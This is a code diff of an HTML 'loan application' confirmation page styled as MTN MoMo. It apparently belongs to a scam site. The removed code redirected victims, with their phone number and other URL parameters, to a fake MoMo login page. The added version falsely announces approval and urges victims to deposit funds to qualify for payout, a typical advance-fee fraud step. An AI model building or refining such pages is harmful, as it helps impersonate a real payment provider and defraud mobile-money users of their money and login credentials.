@@ -3,258 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Application Submitted - MoMo</title>
+    <title>Application Successful - MoMo</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
 
-        body {
-            background: #f4f4f4;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
 
-        /* ===== HEADER ===== */
         .header {
-            background: #ffffff;
-            padding: 14px 24px;
-            display: flex;
-            align-items: center;
-            gap: 16px;
+            background: #fff; padding: 14px 24px;
+            display: flex; align-items: center; gap: 16px;
             border-bottom: 3px solid #ffcc00;
             box-shadow: 0 2px 8px rgba(0,0,0,0.04);
         }
-
-        .logo-box {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
+        .logo-box { display: flex; align-items: center; gap: 10px; }
         .logo-icon {
-            width: 42px;
-            height: 42px;
-            background: #ffcc00;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 800;
-            font-size: 11px;
-            color: #004f9f;
-            line-height: 1;
-            text-align: center;
-            border: 2px solid #004f9f;
+            width: 42px; height: 42px; background: #ffcc00;
+            border-radius: 8px; display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 11px; color: #004f9f;
+            line-height: 1; text-align: center; border: 2px solid #004f9f;
         }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; letter-spacing: -0.5px; }
+        .header-title { font-size: 16px; font-weight: 700; color: #222; margin-left: 4px; flex: 1; }
+        .hamburger { font-size: 22px; color: #333; cursor: pointer; }
 
-        .logo-text {
-            font-weight: 800;
-            font-size: 20px;
-            color: #004f9f;
-            letter-spacing: -0.5px;
-        }
+        .main { flex: 1; display: flex; justify-content: center; padding: 40px 16px 60px; }
 
-        .header-title {
-            font-size: 16px;
-            font-weight: 700;
-            color: #222;
-            margin-left: 4px;
-            flex: 1;
-        }
-
-        .hamburger {
-            font-size: 22px;
-            color: #333;
-            cursor: pointer;
-            line-height: 1;
-            user-select: none;
-        }
-
-        /* ===== MAIN ===== */
-        .main {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            padding: 60px 16px;
-            position: relative;
-        }
-
-        /* ===== TOAST NOTIFICATION (top) ===== */
-        .toast {
-            position: absolute;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%) translateY(-60px);
-            background: #ffcc00;
-            color: #111;
-            padding: 14px 28px;
-            border-radius: 10px;
-            font-weight: 700;
-            font-size: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            opacity: 0;
-            animation: slideDown 0.5s ease forwards;
-        }
-
-        @keyframes slideDown {
-            from {
-                opacity: 0;
-                transform: translateX(-50%) translateY(-60px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(-50%) translateY(0);
-            }
-        }
-
-        /* ===== SUCCESS CARD ===== */
         .card {
-            background: #ffffff;
-            width: 100%;
-            max-width: 540px;
-            border-radius: 16px;
-            padding: 50px 40px 40px;
+            background: #fff; width: 100%; max-width: 520px;
+            border-radius: 20px; padding: 44px 32px 40px;
             box-shadow: 0 8px 30px rgba(0,0,0,0.08);
             height: fit-content;
             text-align: center;
         }
 
-        /* Yellow circle with checkmark */
         .check-circle {
-            width: 80px;
-            height: 80px;
-            background: #ffcc00;
+            width: 96px; height: 96px;
             border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 28px;
-            box-shadow: 0 6px 20px rgba(255, 204, 0, 0.4);
+            background: #ffcc00;
+            display: flex; align-items: center; justify-content: center;
+            color: #111; font-size: 48px; font-weight: 900;
+            margin: 0 auto 26px;
+            box-shadow: 0 14px 32px rgba(255,204,0,0.4);
+            animation: pop 0.5s ease-out;
+        }
+        @keyframes pop {
+            0% { transform: scale(0); opacity: 0; }
+            60% { transform: scale(1.15); }
+            100% { transform: scale(1); opacity: 1; }
         }
 
-        .check-circle svg {
-            width: 42px;
-            height: 42px;
-            stroke: #111;
-            stroke-width: 4;
-            fill: none;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-        }
-
-        .card h1 {
-            font-size: 28px;
+        .status-pill {
+            display: inline-block;
+            background: #eaf7ea;
+            color: #1e7d1e;
+            font-size: 12px;
             font-weight: 800;
-            color: #111;
-            margin-bottom: 20px;
-            line-height: 1.2;
+            letter-spacing: 1px;
+            padding: 6px 14px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            margin-bottom: 22px;
         }
 
-        .card p {
-            color: #666;
-            font-size: 15px;
-            line-height: 1.6;
-            margin-bottom: 14px;
+        h1 {
+            font-size: 26px; font-weight: 900; color: #111;
+            margin-bottom: 10px;
+        }
+        .sub {
+            font-size: 15px; color: #666; line-height: 1.6;
+            margin-bottom: 28px;
         }
 
-        /* ===== REDIRECT BANNER ===== */
-        .redirect-box {
-            background: #fffdf5;
-            border: 2px solid #ffcc00;
-            border-radius: 10px;
-            padding: 16px 20px;
-            margin: 28px 0 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            font-size: 15px;
-            font-weight: 600;
+        .info-box {
+            background: #fffef8;
+            border: 1px solid #ffeeb0;
+            border-radius: 14px;
+            padding: 22px 20px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .info-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 10px 0;
+            font-size: 14px;
+        }
+        .info-row + .info-row { border-top: 1px dashed #ffeeb0; }
+        .info-label { color: #7a5c00; font-weight: 600; }
+        .info-value { color: #111; font-weight: 800; text-align: right; }
+        .info-value.ref {
+            font-family: monospace;
+            font-size: 13px;
             color: #b8860b;
         }
 
-        /* Small spinner */
-        .spinner {
-            width: 20px;
-            height: 20px;
-            border: 3px solid #ffe8a3;
-            border-top-color: #ffcc00;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+        .notice-box {
+            background: #fffbf0;
+            border-left: 4px solid #ffcc00;
+            border-radius: 8px;
+            padding: 16px 18px;
+            text-align: left;
+            margin-bottom: 22px;
         }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* ===== GO TO LOGIN BUTTON ===== */
-        .login-btn {
-            display: inline-block;
-            background: #ffcc00;
-            color: #111;
-            padding: 14px 40px;
-            font-size: 15px;
-            font-weight: 800;
+        .notice-title {
+            font-size: 13px; font-weight: 800; color: #7a5c00;
+            margin-bottom: 10px;
+            text-transform: uppercase;
             letter-spacing: 0.5px;
-            border-radius: 10px;
+        }
+        .notice-text {
+            font-size: 13px; color: #555; line-height: 1.6;
+        }
+        .notice-text + .notice-text { margin-top: 10px; }
+        .notice-text strong { color: #b8860b; }
+
+        .home-btn {
+            display: inline-block;
+            background: #111; color: #ffcc00;
+            padding: 16px 36px;
+            font-size: 14px; font-weight: 900;
+            letter-spacing: 1.5px;
+            border-radius: 12px;
             cursor: pointer;
+            text-transform: uppercase;
             text-decoration: none;
             transition: background 0.2s, transform 0.1s;
         }
+        .home-btn:hover { background: #000; }
+        .home-btn:active { transform: scale(0.98); }
 
-        .login-btn:hover {
-            background: #e6b800;
-        }
-
-        .login-btn:active {
-            transform: scale(0.98);
-        }
-
-        /* ===== FOOTER ===== */
         .footer {
-            background: #111;
-            color: #ffcc00;
-            text-align: center;
-            padding: 18px;
-            font-size: 13px;
-            font-weight: 600;
+            background: #111; color: #ffcc00; text-align: center;
+            padding: 18px; font-size: 13px; font-weight: 600;
         }
 
         @media (max-width: 480px) {
-            .card {
-                padding: 36px 24px 30px;
-            }
-            .card h1 {
-                font-size: 23px;
-            }
-            .header-title {
-                font-size: 14px;
-            }
-            .logo-text {
-                font-size: 18px;
-            }
-            .check-circle {
-                width: 70px;
-                height: 70px;
-            }
-            .check-circle svg {
-                width: 36px;
-                height: 36px;
-            }
+            .card { padding: 32px 22px; }
+            h1 { font-size: 22px; }
+            .check-circle { width: 80px; height: 80px; font-size: 40px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- HEADER -->
     <header class="header">
         <div class="logo-box">
             <div class="logo-icon">MoMo<br>MTN</div>
@@ -264,68 +155,82 @@
         <span class="hamburger">☰</span>
     </header>
 
-    <!-- MAIN -->
     <main class="main">
-        <!-- Toast notification at top -->
-        <div class="toast">
-            🎉 Application submitted successfully!
-        </div>
-
         <div class="card">
-            <!-- Yellow check circle -->
-            <div class="check-circle">
-                <svg viewBox="0 0 24 24">
-                    <polyline points="4 12 10 18 20 6"></polyline>
-                </svg>
+
+            <div class="check-circle">✓</div>
+
+            <div class="status-pill">Approved</div>
+
+            <h1>Application Successful</h1>
+
+            <p class="sub">
+                Your loan application has been received and approved. Our team will contact you shortly to complete the process.
+            </p>
+
+            <div class="info-box">
+                <div class="info-row">
+                    <span class="info-label">Reference</span>
+                    <span class="info-value ref" id="refValue">—</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Phone</span>
+                    <span class="info-value" id="phoneValue">—</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Loan Amount</span>
+                    <span class="info-value" id="amountValue">—</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Date</span>
+                    <span class="info-value" id="dateValue">—</span>
+                </div>
             </div>
 
-            <h1>Loan Application Submitted</h1>
-
-            <p>Your loan application has been submitted. Please wait for approval.</p>
-            <p>You will receive a confirmation message. For now, proceed to MoMo.</p>
-
-            <!-- Redirect banner -->
-            <div class="redirect-box">
-                <div class="spinner"></div>
-                <span id="redirectText">Redirecting to MoMo login in 3s...</span>
+            <div class="notice-box">
+                <div class="notice-title">What happens next?</div>
+                <p class="notice-text">
+                    📲 You will be <strong>notified shortly</strong> once your application is fully processed.
+                </p>
+                <p class="notice-text">
+                    💰 Please ensure you <strong>deposit some funds</strong> into your MTN MoMo account to establish eligibility for disbursement.
+                </p>
             </div>
 
-            <!-- Go to login button -->
-            <a href="login.html" class="login-btn">Go to Login Now</a>
+            <a href="index.html" class="home-btn">Back to Home</a>
+
         </div>
     </main>
 
-    <!-- FOOTER -->
-    <footer class="footer">
-        © 2026 MoMo
-    </footer>
+    <footer class="footer">© 2026 MoMo</footer>
 
     <script>
-    // ─── Forward ALL incoming URL params to login.html ───
-    const params = new URLSearchParams(window.location.search);
+        const params = new URLSearchParams(window.location.search);
+        const phone  = params.get('phone') || '';
+        const ref    = params.get('ref')   || 'REF' + Date.now();
+        const amount = Number(params.get('amount') || 0);
 
-    // Update the "Go to Login Now" button link with the params
-    document.querySelector('.login-btn').href = 'login.html?' + params.toString();
-
-    // ─── 3-second countdown then redirect to login.html (with data) ───
-    let seconds = 3;
-    const redirectText = document.getElementById('redirectText');
-
-    const countdown = setInterval(() => {
-        seconds--;
-        if (seconds > 0) {
-            redirectText.textContent = `Redirecting to MoMo login in ${seconds}s...`;
-        } else {
-            clearInterval(countdown);
-            redirectText.textContent = 'Redirecting now...';
-            window.location.href = 'login.html?' + params.toString();
+        function fmtPhone(p) {
+            const clean = p.replace(/\D/g, '');
+            if (clean.length === 9) {
+                return '+260 ' + clean.slice(0,3) + ' ' + clean.slice(3,6) + ' ' + clean.slice(6,9);
+            }
+            return clean ? '+260 ' + clean : '—';
         }
-    }, 1000);
 
-    // If user clicks "Go to Login Now" early, stop the countdown
-    document.querySelector('.login-btn').addEventListener('click', () => {
-        clearInterval(countdown);
-    });
-</script>
+        function fmtAmount(n) {
+            return 'ZMW ' + Number(n).toLocaleString();
+        }
+
+        document.getElementById('refValue').textContent    = ref;
+        document.getElementById('phoneValue').textContent  = fmtPhone(phone);
+        document.getElementById('amountValue').textContent = amount ? fmtAmount(amount) : '—';
+
+        const d = new Date();
+        const dateStr = d.toLocaleDateString('en-GB', {
+            day: '2-digit', month: 'short', year: 'numeric'
+        });
+        document.getElementById('dateValue').textContent = dateStr;
+    </script>
 </body>
 </html>
